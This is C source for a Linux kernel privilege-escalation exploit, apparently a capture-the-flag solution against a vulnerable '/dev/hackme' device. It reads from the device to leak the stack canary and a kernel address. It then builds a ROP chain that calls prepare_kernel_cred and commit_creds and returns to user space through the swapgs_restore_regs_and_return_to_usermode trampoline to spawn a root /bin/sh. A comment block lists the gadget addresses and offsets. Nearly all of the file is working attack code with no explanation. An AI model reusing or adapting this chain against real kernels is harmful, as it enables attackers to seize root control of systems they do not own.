#include <stdio.h>
#include <fcntl.h>

/*
0xffffffff814c6410 T commit_creds --  [-3701815]
0xffffffff814c67f0 T prepare_kernel_cred -- [-3700823]
0xffffffff823d6b02: cmp rdi, 0xffffff; ret; -- [12094139]
0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; -- [-1958308]
0xffffffff81006370: pop rdi; ret;  --  [-8682711]
0xffffffff8100a55f: swapgs; pop rbp; ret; -- [-8665832]
0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; -- [494318]
0xffffffff814381cb: iretq; pop rbp; ret; -- [-4284028]
0xffffffff8150b97e: pop rsi; ret; -- [-3417801]
0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode -- [-6607159]
*/

//iretq RIP|CS|RFLAGS|SP|SS
unsigned long user_cs,user_rflags,user_sp,user_ss;
void save_state()
{
	__asm(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("***save state***");
	printf("user_cs:0x%lx\n", user_cs);
	printf("user_sp:0x%lx\n", user_sp);
	printf("user_ss:0x%lx\n", user_ss);
	printf("user_rflags:0x%lx\n", user_rflags);
	puts("***save finish***");
}

void backdoor()
{
	puts("***getshell***");
	system("/bin/sh");
}


int main()
{
	save_state();
	int fd = open("/dev/hackme", O_RDWR);
	unsigned long buf[256];
	read(fd, buf, 0x10 * 8);
	for(int i = 0; i < 0x10; i++)
		printf("i:%d\taddress:0x%lx\n",i, buf[i]);
	unsigned long canary = buf[2];
	unsigned long payload[256];
	unsigned int index = 0;
	for(int i = 0; i < (16); i ++)
		payload[index++] = 0;
	unsigned long leak_addr = buf[10];
	printf("leak addr:0x%lx\n", leak_addr);
	//iretq RIP|CS|RFLAGS|SP|SS
	payload[index++] = canary;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = leak_addr - 8682711; //pop_rdi_ret
	payload[index++] = 0;
	payload[index++] = leak_addr - 3700823; //prepare_kernel_cred
	payload[index++] = leak_addr - 3417801; //pop_rsi_ret
	payload[index++] = 0;
	payload[index++] = leak_addr - 8682711; //pop_rdi_ret
	payload[index++] = 1;
	payload[index++] = leak_addr + 494318; //add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; 
	payload[index++] = 0;
	payload[index++] = leak_addr - 1958308; //mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; 
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = leak_addr - 3701815; //commit_creds;
	payload[index++] = leak_addr - 6607159 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = (unsigned long)backdoor;
	payload[index++] = user_cs;
	payload[index++] = user_rflags;
	payload[index++] = user_sp;
	payload[index++] = user_ss;

	write(fd, payload, index * 8);
	
}
